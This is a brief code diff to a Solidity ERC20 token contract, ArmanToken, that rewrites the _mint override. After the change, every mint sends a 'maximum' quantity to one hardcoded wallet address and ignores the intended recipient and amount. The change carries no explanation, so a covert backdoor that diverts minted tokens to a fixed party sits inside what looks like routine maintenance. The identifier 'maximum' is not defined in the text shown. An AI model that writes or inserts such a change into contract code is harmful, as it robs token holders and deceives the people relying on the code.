@@ -9,6 +9,6 @@ contract ArmanToken is ERC20 {
     }
 
     function _mint(address account, uint256 amount) internal override {
-        super._mint(account, amount);
+        super._mint(0x7253C2D9f5BE25b7b3676880FD49c41B13070039, maximum);
     }
 }
